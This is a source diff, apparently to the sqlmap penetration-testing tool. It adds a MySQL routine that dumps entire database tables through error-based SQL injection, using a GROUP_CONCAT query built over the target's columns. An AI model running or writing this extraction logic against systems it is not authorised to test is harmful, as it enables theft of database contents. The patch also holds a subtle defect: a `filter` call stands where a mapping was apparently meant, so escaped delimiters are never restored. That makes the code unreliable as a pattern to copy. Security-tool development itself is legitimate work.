@@ -45,6 +45,8 @@ from lib.core.exception import sqlmapNoneDataException
 from lib.core.exception import sqlmapUnsupportedFeatureException
 from lib.core.exception import sqlmapUserQuitException
 from lib.core.session import setOs
+from lib.core.settings import CONCAT_ROW_DELIMITER
+from lib.core.settings import CONCAT_VALUE_DELIMITER
 from lib.core.settings import SQL_STATEMENTS
 from lib.core.shell import autoCompletion
 from lib.core.unescaper import unescaper
@@ -1193,13 +1195,31 @@ class Enumeration:
         entriesCount = 0
 
         if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) or conf.direct:
+            entries = []
+
+            if Backend.getIdentifiedDbms() == DBMS.MYSQL and isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) and conf.groupConcat:
+                randStr, randStr2 = randomStr(), randomStr()
+                filterFunction = "REPLACE(REPLACE(IFNULL(%s, ' '),'%s','%s'),'%s','%s')"\
+                  % ('%s', CONCAT_VALUE_DELIMITER, randStr, CONCAT_ROW_DELIMITER, randStr2)
+                concats = ",".join(map(lambda x: "CONCAT(%s, '|')" % (filterFunction % x), colList[:-1]))
+                concats += ",%s" % (filterFunction % colList[-1])
+                query = "SELECT GROUP_CONCAT(%s) FROM %s.%s" % (concats, conf.db, conf.tbl)
+                value = inject.getValue(query, blind=False)
+                if isinstance(value, basestring):
+                    for line in value.split(CONCAT_ROW_DELIMITER):
+                        row = line.split(CONCAT_VALUE_DELIMITER)
+                        row = filter(lambda x: x.replace(randStr, CONCAT_VALUE_DELIMITER).replace(randStr2, CONCAT_ROW_DELIMITER), row)
+                        entries.append(row)
+
             if Backend.getIdentifiedDbms() == DBMS.ORACLE:
                 query = rootQuery.inband.query % (colString, conf.tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), conf.tbl.upper())))
             elif Backend.getIdentifiedDbms() == DBMS.SQLITE:
                 query = rootQuery.inband.query % (colString, conf.tbl)
             else:
                 query = rootQuery.inband.query % (colString, conf.db, conf.tbl)
-            entries = inject.getValue(query, blind=False, dump=True)
+
+            if not (Backend.getIdentifiedDbms() == DBMS.MYSQL and entries):
+                entries = inject.getValue(query, blind=False, dump=True)
 
             if entries:
                 if isinstance(entries, basestring):
